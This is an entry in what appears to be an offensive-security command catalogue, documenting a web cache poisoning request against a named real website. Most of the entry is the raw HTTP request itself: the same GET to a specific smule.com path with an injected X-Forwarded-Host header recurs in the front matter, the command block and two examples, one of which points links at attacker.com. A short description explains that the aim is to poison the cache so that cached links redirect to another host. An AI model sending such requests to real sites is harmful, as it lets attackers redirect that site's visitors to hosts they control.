---
data: >-
  GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1

  Host: www.smule.com

  X-Forwarded-Host: localhost

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101
  Firefox/61.0

  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

  Accept-Language: en-GB,en;q=0.5

  Accept-Encoding: gzip, deflate

  Cookie: [redacted]

  Connection: close

  Upgrade-Insecure-Requests: 1

  If-None-Match: W/"74107fb6dcc410390f339e5ddabc3022"

  Cache-Control: max-age=0
tags:
  - http
  - cache-poisoning
type: command
executor: bash
platforms:
  - Web
id: af724588-b54f-42c0-8b75-d2126acec1cd
created_at: '2025-12-13T09:00:34.287Z'
updated_at: '2025-12-13T09:00:34.287Z'
verified: false
validated: true
submitted: true
---
# GET with X-Forwarded-Host

## Command

```bash
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: [redacted]
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"74107fb6dcc410390f339e5ddabc3022"
Cache-Control: max-age=0
```

## Description

This command sends a modified GET request to poison the web cache by injecting X-Forwarded-Host, used in web cache poisoning attacks to redirect links.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `X-Forwarded-Host` | Sets the host to redirect links to (e.g., localhost) | Yes |
| `Host` | Target host (www.smule.com) | Yes |

## Examples

### Basic Usage

```bash
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
```

### Advanced Usage

```bash
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: attacker.com
Cookie: session_cookie
```

## Expected Output

Modified HTML response with links pointing to the injected host.

## Related

- [[procedures/Inject-X-Forwarded-Host-to-Poison-Web-Cache]]
